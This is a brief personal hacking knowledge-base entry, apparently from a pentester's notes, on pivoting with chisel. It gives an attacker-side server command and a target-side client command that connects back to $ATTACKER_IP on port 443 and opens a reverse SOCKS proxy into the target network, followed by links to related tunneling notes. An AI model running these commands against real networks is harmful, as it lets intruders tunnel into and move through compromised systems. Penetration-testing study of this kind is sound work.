# tunneling through chisel - socks

- Tunnel through 443 and open a socks proxy on attacker localhost.
  - attacker
    ```bash
    ./chisel server --port 443 --reverse
    ```
  - target
    ```
    ./chisel client $ATTACKER_IP:443 R:socks
    ```

` zet/20221003150604/README.md `

# Related

- [20221020154329](/zet/20221020154329/README.md) port forwarding concept
- [20221003150107](/zet/20221003150107/README.md) ssh port forwarding
- [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
- [20221014185949](/zet/20221014185949/README.md) kb file named kb/hacking/commands/pivot-tunnel-through-chisel.md
- [20221003150116](/zet/20221003150116/README.md) socat over proxy
- [20221003150603](/zet/20221003150603/README.md) tunneling through chisel - socks Attacker
- [20221003150602](/zet/20221003150602/README.md) tunneling through chisel - socks Target
- [20221003150601](/zet/20221003150601/README.md) tunneling Forward specific port through chisel
- ~/kb/hacking/commands/pivot-tunnel-through-chisel.md

Tags:

    #command #hacking #pivot 
